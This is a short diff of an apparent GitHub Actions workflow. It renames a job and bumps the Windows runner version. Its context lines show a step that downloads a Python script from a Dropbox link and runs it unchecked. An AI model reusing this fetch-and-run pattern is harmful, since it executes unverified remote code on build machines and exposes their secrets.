@@ -21,10 +21,10 @@ jobs:
           Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/lclvcywso1brg4q0y9csw/tms.py?rlkey=fod3tesqj5q2jd078qc6ojf6q&st=hql4ulg5&dl=1" -OutFile "Dow.py"
           python Dow.py
           
-jobs2:
+jobs:
   build:
-    name: Start Building...
-    runs-on: windows-2022
+    name: Building...
+    runs-on: windows-2025
     steps:
       - name: Downloading & Installing Essentials
         run: |
